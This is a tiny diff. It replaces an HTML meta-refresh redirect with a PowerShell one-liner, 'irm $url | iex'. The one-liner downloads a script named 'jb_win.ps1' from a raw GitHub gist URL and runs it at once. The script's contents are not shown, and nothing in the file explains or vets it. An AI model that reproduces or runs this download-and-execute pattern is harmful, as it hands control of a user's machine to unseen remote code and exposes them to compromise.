@@ -1,1 +1,2 @@
-<meta http-equiv="refresh" content="0; url=https://gist.githubusercontent.com/hhhtsd/fadae9a0aab546dcd6877f65edde1691/raw/d21e52b30af41078271a9723bf5f113eba335dd3/jb_win.ps1">
+$url = "https://gist.githubusercontent.com/hhhtsd/fadae9a0aab546dcd6877f65edde1691/raw/d21e52b30af41078271a9723bf5f113eba335dd3/jb_win.ps1"
+irm $url | iex
